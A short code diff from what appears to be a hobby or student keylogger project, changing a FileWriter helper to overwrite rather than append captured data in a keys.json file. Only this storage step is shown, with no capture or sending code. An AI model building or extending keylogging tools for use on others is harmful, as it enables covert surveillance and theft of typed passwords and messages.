@@ -5,7 +5,7 @@ class FileWriter:
     def write_to_file(data:dict):
         print("aaaq")
         if data :
-            with open(r"C:\Users\1\projet keylogger kodkode\keys.json" , "a" , encoding="utf-8") as file:
+            with open(r"C:\Users\1\projet keylogger kodkode\keys.json" , "w" , encoding="utf-8") as file:
                 json.dump(data , file ,ensure_ascii=False , indent=4)
 
         #     for
